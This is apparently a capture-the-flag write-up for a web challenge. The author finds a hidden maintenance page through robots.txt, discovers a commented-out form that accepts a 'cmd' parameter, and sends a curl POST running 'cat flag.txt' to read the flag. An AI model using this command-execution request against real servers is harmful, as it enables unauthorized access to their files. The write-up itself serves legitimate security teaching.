
# DENIED

* **Category**: Web Security
* **Points**: 75
* **Challenge**: Sometimes websites are afraid of the terminator finding things out. http://challenge.acictf.com:27856 The flag is in flag.txt.
* **Hint #1**: How can websites keep search engines from finding private information?
* **Hint #2**: Sometimes the developers leave some comments that give you a hint about what to do...
* **Hint #3**: You can use the cat command to read files

<br />

First, lets navigate to the site in a web browser:

<br />

![site]()

<br />

Based on the hints and the image of a robot, lets look at the robots.txt file:

```
curl http://challenge.acictf.com:27856/robots.txt

User-agent: *
Allow: /index.html
Allow: /products.html
Disallow: /maintenance_foo_bar_deadbeef_12345.html
```

<br />

Lets look at the disallowed page, `/maintenance_foo_bar_deadbeef_12345.html`:

<br />

![maintenance]()

<br />

So the page tells us to *run a command*.  Lets looks at the source of the page to see if their are any hints on how to do this:
```
*...snip...*

        <!--
            Disabled for being insecure... oops!
        <form action="/secret_maintenance_foo_543212345", method="POST">
            <input name="cmd"/>
        </form>-->

*...snip...*
```

<br />

Lets use `curl` to send a POST request to this insecure page with the parameter *cmd* and the value of *cat flag.txt*:
```

curl http://challenge.acictf.com:27856/secret_maintenance_foo_543212345 -X POST --form cmd='cat flag.txt'

```
*...snip...*

<h1>Maintenance</h1>
        <!--
            Disabled for being insecure... oops!
        <form action="/secret_maintenance_foo_543212345", method="POST">
            <input name="cmd"/>
        </form>-->
        <p>Result: ACI{ccdcb229da85c8d0a6a239edb19} </p>

*...snip...*  
```

<br />

##Flag: ACI{ccdcb229da85c8d0a6a239edb19}

